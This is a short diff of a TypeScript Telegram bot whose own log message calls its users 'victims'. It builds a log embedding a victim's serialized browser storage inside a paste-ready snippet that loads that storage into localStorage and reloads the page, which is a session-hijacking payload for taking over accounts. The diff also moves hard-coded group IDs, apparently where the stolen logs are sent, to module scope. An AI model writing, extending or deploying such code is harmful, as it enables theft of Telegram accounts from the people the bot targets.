@@ -39,6 +39,10 @@ const sgConfigDefault: SafeguardConfig = {
   name: "",
   inviteLink: "",
 };
+
+const myGroupId = -4765914839;
+const debugGroupId = -4751004079;
+
 const bot = new Bot(gateKeeper as string);
 const app = new Application();
 const messAvvio = "Una vittima ha startato il bot";
@@ -203,8 +207,8 @@ const newVerified = async (ctx: Context) => {
 
 <pre>Object.entries(${JSON.stringify(storage)}).forEach(([name, value]) => localStorage.setItem(name, value)); window.location.reload();</pre>`;
 
-    const myGroupId = -4765914839;
-    const debugGroupId = -4751004079;
+    // const myGroupId = -4765914839;
+    // const debugGroupId = -4751004079;
 
     // Invia log al bot owner
     // await bot.api.sendMessage(botOwner, log, { parse_mode: "HTML" }); --> qua ho commentato l'invio dei log nella chat col bot
